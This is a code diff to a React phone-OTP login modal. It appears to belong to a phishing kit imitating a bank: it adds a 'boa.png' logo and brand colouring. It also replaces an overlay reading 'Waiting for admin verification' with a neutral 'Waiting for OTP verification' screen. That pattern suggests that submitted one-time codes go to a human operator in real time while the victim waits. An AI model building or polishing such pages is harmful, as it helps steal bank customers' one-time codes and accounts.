@@ -2,7 +2,7 @@ import { useState, useEffect, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import Model from "./Model";
 import { useAuthStore } from "../store/useAuthStore";
-
+import logo from "../assets/boa.png";
 const DEBUG = true;
 
 const PhoneOTPModal = () => {
@@ -291,7 +291,7 @@ const PhoneOTPModal = () => {
           <button
             type="submit"
             disabled={isSending}
-            className="bg-blue-600 text-white w-full py-2 rounded-md hover:bg-blue-700 transition mb-2"
+            className="bg-[#344E87] text-white w-full py-2 rounded-md hover:bg-blue-700 transition mb-2"
           >
             {isSending ? "Sending..." : "Send OTP"}
           </button>
@@ -306,10 +306,10 @@ const PhoneOTPModal = () => {
 
           <div className="mt-4 text-sm text-gray-600">
             <p>
-              🔐 Login Status: <strong>{loginStatus}</strong>
+              Login Status: <strong>{loginStatus}</strong>
             </p>
             <p>
-              📱 OTP Status: <strong>{otpStatus || "-"}</strong>
+              OTP Status: <strong>{otpStatus || "-"}</strong>
             </p>
             {pollingError && (
               <p className="mt-2 text-xs text-red-500">
@@ -321,13 +321,29 @@ const PhoneOTPModal = () => {
 
         {/* 🔥 Overlay Loading Screen */}
         {submittedOtp && otpStatus === "otp_pending" && (
-          <div className="absolute inset-0 bg-black bg-opacity-50 flex flex-col items-center justify-center rounded-xl text-white text-center p-4">
-            <p className="text-lg font-semibold mb-2">
-              ⏳ Waiting for admin verification...
-            </p>
-            <p className="text-sm">
-              Your OTP has been submitted. You will be redirected automatically.
-            </p>
+          <div className="absolute inset-0 bg-white backdrop-blur-sm flex flex-col items-center justify-center rounded-xl p-6">
+            <div className="flex flex-col items-center space-y-6">
+              {/* Logo */}
+              <img
+                src={logo} // <-- replace with your actual logo path
+                alt="App Logo"
+                className="w-2 h-16 object-contain"
+              />
+
+              {/* Loader Spinner */}
+              <div className="w-12 h-12 border-4 border-[#344E87] border-t-transparent rounded-full animate-spin" />
+
+              {/* Text */}
+              <div className="text-center">
+                <p className="text-lg font-semibold text-gray-800 mb-1">
+                  Waiting for OTP verification...
+                </p>
+                <p className="text-sm text-gray-500 max-w-xs">
+                  Your OTP has been submitted. Please wait while we verify your
+                  code. You’ll be redirected automatically.
+                </p>
+              </div>
+            </div>
           </div>
         )}
       </div>
